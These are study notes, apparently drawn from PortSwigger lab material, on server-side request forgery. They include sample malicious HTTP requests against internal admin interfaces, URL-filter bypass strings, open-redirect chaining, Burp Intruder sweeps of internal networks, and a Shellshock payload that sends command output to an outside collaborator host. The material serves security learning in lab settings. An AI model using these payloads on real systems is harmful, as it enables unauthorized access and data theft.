## Definition
Server-side request forgery (SSRF):
allows an attacker to cause the server-side app to make requests to an unintended location

In a typical SSRF attack:
- the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure
In other cases:
- they may be able to force the server to connect to arbitrary external systems. 
  This could leak sensitive data, such as authorization credentials
## URL validation bypass cheat sheet
https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet

## Common SSRF attacks
SSRF attacks often exploit trust relationships to:
escalate an attack from the vulnerable app and perform unauthorized action

### SSRF attacks against the server
In an SSRF attack against the server:
the attacker causes the app to:
- make an HTTP request back to the server that is hosting the application
	- via its loopback network interface
=>
This typically involves supplying a URL with a hostname like -->  `127.0.0.1` or `localhost`

imagine a shopping app:
- that lets the user view whether an item is in stock in a particular store.
- To provide the stock information, the app must query various back-end REST APIs. 
- It does this by :
	- passing the URL to the relevant back-end API endpoint via a front-end HTTP request. 
	- When a user views the stock status for an item, 
	  their browser makes the following request:
	  
```http
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118 stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```
=>
This causes the server to -->  make a request to the specified URL, 
                          retrieve the stock status, 
                          and return this to the user.

In this example, an attacker can modify the request to specify a URL local to the server:
```http
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118 
stockApi=http://localhost/admin
```
=>
The server fetches the contents of the `/admin` URL and returns it to the user

an attacker can:
- visit the `/admin` URL, 
  but the administrative functionality is normally only accessible to authenticated users
BUT:
ff the request to the `/admin` URL comes from the local machine:
the normal access controls -->  are bypassed
=>
The application -->  grants full access to the administrative functionality
bc -->   the request appears to originate from a trusted location

#### Basic SSRF against the local server
- Browse to `/admin` and observe that you can't directly access the admin page.
- Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
- Change the URL in the `stockApi` parameter to `http://localhost/admin`. This should display the administration interface.
- Read the HTML to identify the URL to delete the target user, which is:
  `http://localhost/admin/delete?username=carlos`
- Submit this URL in the `stockApi` parameter

### SSRF attacks against other back-end systems
In some cases, the application server:
is able to interact with -->  back-end systems that are not directly reachable by users
These systems:
- often have non-routable private IP addresses. 
- the back-end systems are normally protected by the network topology
  =>
  they often have a weaker security posture.
In many cases:
internal back-end systems:
contain sensitive functionality -->  that can be accessed without authentication by anyone 
						      who is able to interact with the systems
In the previous example:
imagine there is an administrative interface at the back-end URL --> `https://192.168.0.68/admin`=>
An attacker can:
- submit the following request to exploit the SSRF vulnerability
- and access the administrative interface:
```http
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118 
stockApi=http://192.168.0.68/admin
```

#### Basic SSRF against another back-end system
1. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Intruder.
2. Click "Clear §", change the `stockApi` parameter to `http://192.168.0.1:8080/admin` then highlight the final octet of the IP address (the number `1`), click "Add §".
3. Switch to the Payloads tab, change the payload type to Numbers, and enter 1, 255, and 1 in the "From" and "To" and "Step" boxes respectively.
4. Click "Start attack".
5. Click on the "Status" column to sort it by status code ascending. You should see a single entry with a status of 200, showing an admin interface.
6. Click on this request, send it to Burp Repeater, and change the path in the `stockApi` to: `/admin/delete?username=carlos`

## Circumventing common SSRF defenses
It is common to see applications:
 containing SSRF behavior together with --> defenses aimed at preventing malicious 
                                      exploitation
#### SSRF with blacklist-based input filters 
Some apps block input containing hostnames like:
- `127.0.0.1` and `localhost`
- or sensitive URLs like `/admin`
=>
In this situation, you can often circumvent the filter using the following techniques:
- Use an alternative IP representation of `127.0.0.1`
  es -->  `2130706433`, `017700000001`, or `127.1`.
- Register your own domain name that resolves to `127.0.0.1`. 
  you can use `spoofed.burpcollaborator.net` for this purpose.
- Obfuscate blocked strings using URL encoding or case variation.
- Provide a URL that you control:
	- which redirects to the target URL. 
	- Try using different redirect codes, as well as different protocols for the target URL. For example,:
	  switching from an `http:` to `https:` URL during the redirect has been shown to bypass some anti-SSRF filters

### SSRF with whitelist-based input filters
Some applications only allow inputs that match -->   a whitelist of permitted values
The filter may look fo:
- a match at the beginning of the input
- or contained within in it.
=>
You may be able to bypass this filter -->  by exploiting inconsistencies in URL parsing

The URL specification:
contains a n° of features that are likely to be overlooked when URLs implement ad-hoc parsing and validation using this method:
- You can embed credentials in a URL before the hostname, using the `@` character. 
  For example:
  `https://expected-host:fakepassword@evil-host`
- You can use the `#` character to indicate a URL fragment. 
  For example:
  `https://evil-host#expected-host`
- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. 
  For example:
  `https://expected-host.evil-host`
- You can URL-encode characters to confuse the URL-parsing code. 
  This is particularly useful if:
  the code that implements the filter handles URL-encoded ch differently than the code that performs the back-end HTTP request. 
  - You can also try [double-encoding](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-double-url-encoding) ch
    some servers recursively URL-decode the input they receive, 
    which can lead to further discrepancies.
- You can use combinations of these techniques together

### SSRF with whitelist-based input filter
1. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
2. Change the URL in the `stockApi` parameter to `http://127.0.0.1/` and observe that the application is parsing the URL, extracting the hostname, and validating it against a whitelist.
3. Change the URL to `http://username@stock.weliketoshop.net/` and observe that this is accepted, indicating that the URL parser supports embedded credentials.
4. Append a `#` to the username and observe that the URL is now rejected.
5. Double-URL encode the `#` to `%2523` and observe the extremely suspicious "Internal Server Error" response, indicating that the server may have attempted to connect to "username".
6. To access the admin interface and delete the target user, change the URL to:
   `http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`

### Bypassing SSRF filters via open redirection
It is sometimes possible to:
bypass filter-based defenses -->  by exploiting an open redirection vulnerability

In the previous example:
imagine the user-submitted URL is strictly validated to prevent malicious exploitation of the SSRF behavior. 
However, the app -->  whose URLs are allowed contains an open redirection vulnerability. Provided the API used to make the back-end HTTP request supports redirections:
=>
you can construct a URL -->  that satisfies the filter and results in a redirected request to 
                         the desired back-end target

For example, the app contains an open redirection vulnerability in which the following URL:
`/product/nextProduct?currentProductId=6&path=http://evil-user.net`

returns a redirection to:
`http://evil-user.net`
=>
You can leverage the open redirection vulnerability:
- to bypass the URL filter
- and exploit the SSRF vulnerability as follows:
```http
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118 
stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```
This SSRF exploit works because the app:
- first validates that the supplied `stockAPI` URL is on an allowed domain, which it is. 
- then requests the supplied URL, which triggers the open redirection
- It follows the redirection
- and makes a request to the internal URL of the attacker's choosing

#### SSRF with filter bypass via open redirection vulnerability
1. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
2. Try tampering with the `stockApi` parameter and observe that it isn't possible to make the server issue the request directly to a different host.
3. Click "next product" and observe that the `path` parameter is placed into the Location header of a redirection response, resulting in an open redirection.
4. Create a URL that exploits the open redirection vulnerability, and redirects to the admin interface, and feed this into the `stockApi` parameter on the stock checker:
   `/product/nextProduct?path=http://192.168.0.12:8080/admin`
5. Observe that the stock checker follows the redirection and shows you the admin page.
6. Amend the path to delete the target user:
   `/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`

## Blind SSRF
The most reliable way to detect blind SSRF vulnerabilities is using out-of-band techniques (OAST)
This involves attempting to:
- trigger an HTTP request to an external system that you control
- and monitoring for network interactions with that system.

The easiest and most effective way to use out-of-band techniques is using -->  Collaborator

### Blind SSRF with out-of-band detection
1. Visit a product, intercept the request in Burp Suite, and send it to Burp Repeater.
2. Go to the Repeater tab. Select the Referer header, 
   right-click and select "Insert Collaborator Payload" to replace the original domain with a Burp Collaborator generated domain.
3. Send the request.
1. Go to the Collaborator tab, and click "Poll now".
2. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
### Blind SSRF with Shellshock exploitation
- In [Burp Suite Professional](https://portswigger.net/burp/pro), install the "Collaborator Everywhere" extension from the BApp Store.
- Add the domain of the lab to Burp Suite's [target scope](https://portswigger.net/burp/documentation/desktop/tools/target/scope), so that Collaborator Everywhere will target it.
- Browse the site.
- Observe that when you load a product page, it triggers an HTTP interaction with Burp Collaborator, via the Referer header.
- Observe that the HTTP interaction contains your User-Agent string within the HTTP request.
- Send the request to the product page to Burp Intruder.
- Go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab and generate a unique Burp Collaborator payload. Place this into the following Shellshock payload:
  `() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN`
- Replace the User-Agent string in the Burp Intruder request with the Shellshock payload containing your Collaborator domain.
- Click "Clear §", change the Referer header to `http://192.168.0.1:8080` then highlight the final octet of the IP address (the number `1`), click "Add §".
- Switch to the Payloads tab, change the payload type to Numbers, and enter 1, 255, and 1 in the "From" and "To" and "Step" boxes respectively.
- Click "Start attack".
- When the attack is finished, go back to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously. You should see a DNS interaction that was initiated by the back-end system that was hit by the successful blind [SSRF attack](https://portswigger.net/web-security/ssrf). The name of the OS user should appear within the DNS subdomain.
- To complete the lab, enter the name of the OS user
  
## Finding hidden attack surface for SSRF vulnerabilities
Many server-side request forgery vulnerabilities are easy to find:
bc -->  the app's normal traffic involves request parameters containing full URLs. 

Other examples of SSRF are harder to locate

### Partial URLs in requests
Sometimes, an app places only a hostname or part of a URL path into request parameters. The value submitted is then -->  incorporated server-side into a full URL that is requested. 
If the value is readily recognized as a hostname or URL path:
=>
the potential attack surface might be obvious. 
However, exploitability as full SSRF might be limited because you do not control the entire URL that gets requested.

### URLs within data formats
Some apps transmit data in formats with a specification that:
allows -->   the inclusion of URLs that might get requested by the data parser for the format. An obvious example of this is:
the XML data format -->  which has been widely used in web applications to transmit 
					  structured data from the client to the server. 
When an application accepts data in XML format and parses it:
- it might be vulnerable to [XXE injection](https://portswigger.net/web-security/xxe)
- It might also be vulnerable to SSRF via XXE

### SSRF via the Referer header
Some apps use server-side analytics software to tracks visitors. 
This software often :
- ogs the Referer header in requests
  =>
  so it can track incoming links
Often the analytics software -->  visits any third-party URLs that appear in the Referer 
							header
This is typically done to:
- analyze the contents of referring sites
- including the anchor text that is used in the incoming links.
As a result:
the Referer header is often a useful attack surface for SSRF vulnerabilities
